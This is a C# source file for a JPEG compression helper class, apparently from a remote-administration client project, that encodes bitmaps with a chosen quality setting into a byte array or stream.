using System.Drawing;
using System.Drawing.Imaging;
using System.IO;

namespace xClient.Core.Misc
{
    public class JpgCompression
    {
        private readonly ImageCodecInfo _encoderInfo;
        private readonly EncoderParameters _encoderParams;
        private readonly EncoderParameter _parameter;

        public JpgCompression(int quality)
        {
            _parameter = new EncoderParameter(Encoder.Quality, quality);
            _encoderInfo = GetEncoderInfo("image/jpeg");
            _encoderParams = new EncoderParameters(2);
            _encoderParams.Param[0] = _parameter;
            _encoderParams.Param[1] = new EncoderParameter(Encoder.Compression, (long) EncoderValue.CompressionRle);
        }

        public byte[] Compress(Bitmap bmp)
        {
            using (var stream = new MemoryStream())
            {
                bmp.Save(stream, _encoderInfo, _encoderParams);
                return stream.ToArray();
            }
        }

        public void Compress(Bitmap bmp, ref Stream targetStream)
        {
            bmp.Save(targetStream, _encoderInfo, _encoderParams);
        }

        private ImageCodecInfo GetEncoderInfo(string mimeType)
        {
            var imageEncoders = ImageCodecInfo.GetImageEncoders();
            var num2 = imageEncoders.Length - 1;
            for (var i = 0; i <= num2; i++)
            {
                if (imageEncoders[i].MimeType == mimeType)
                {
                    return imageEncoders[i];
                }
            }
            return null;
        }
    }
}